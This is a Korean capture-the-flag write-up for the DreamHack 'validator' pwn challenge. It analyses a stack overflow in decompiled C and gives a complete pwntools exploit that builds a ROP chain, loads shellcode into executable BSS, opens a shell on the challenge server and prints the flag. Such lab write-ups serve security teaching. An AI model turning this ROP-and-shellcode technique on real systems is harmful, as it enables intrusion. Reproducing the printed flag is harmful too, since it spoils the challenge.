# [DreamHack] validator

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 취약한 인증 프로그램을 익스플로잇해 flag를 획득하세요!
>
> Release: [validator.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549584/validator.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160320930-5d1b2500-f700-48f4-b49e-272e034e19a8.png)

## Analysis

### main()

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  memset(s, 0, 0x10uLL);
  read(0, s, 0x400uLL);
  validate((__int64)s, 0x80uLL);
  return 0;
}
```

`read(0, s, 0x400uLL)`에서 BOF가 발생한다. `validate()`를 통과하는 조건을 맞춰주면 ROP를 수행할 수 있다.

### validate()

```c
__int64 __fastcall validate(__int64 string, unsigned __int64 length)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]
  int j; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( *(_BYTE *)((int)i + string) != correct[i] )
      exit(0);
  }
  for ( j = 11; length > j; ++j )
  {
    if ( *(unsigned __int8 *)(j + string) != *(char *)(j + 1LL + string) + 1 )
      exit(0);
  }
  return 0LL;
}
```

두 가지 조건을 통과하면 정상적으로 0을 반환한다.

첫 번째 조건은 `string[0]`부터 `string[9]`까지가 `correct[0]`~`correct[9]`와 같아야 한다.

![image](https://user-images.githubusercontent.com/102066383/160321659-400ddf58-d211-42d2-96f3-378b6cc2da5d.png)

두 번째 조건은 `string[11]`부터 `string[length + 1]`까지의 바이트가 1씩 감소해야 한다.

## Exploit

BSS에 실행 권한이 있으므로, BSS에 셸코드를 넣고 그 주소로 점프하면 셸을 획득할 수 있다.

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/validator_dist')
else:
    r = remote('host1.dreamhack.games', 9998)


def generate_payload(ropchain):
    # first condition
    payload = b'DREAMHACK!'
    payload += b' '

    # second condition
    for i in range(11, 0x82):
        payload += bytes([0x82 - i])

    # ROP
    payload = payload.ljust(0x88, b' ')
    payload += ropchain

    return payload


pop_rdi = 0x4006f3  # pop rdi; ret
pop_rsi_r15 = 0x4006f1  # pop rsi; pop r15; ret
pop_rdx = 0x40057b  # pop rdx; ret
bss = 0x601050  # empty bss
read_plt = 0x400470  # PLT of read()


# insert shellcode in bss
# read(0, bss, 100)
rop = p64(pop_rdi)
rop += p64(0)
rop += p64(pop_rsi_r15)
rop += p64(bss)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(100)
rop += p64(read_plt)

rop += p64(bss)  # jump to shellcode

payload = generate_payload(rop)
r.send(payload)

shellcode = asm(shellcraft.sh())
r.send(shellcode)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 9998: Done
[*] Switching to interactive mode
$ cat flag
DH{009bcc2d5c4b1b5af909a4f3c973d1ae}
```
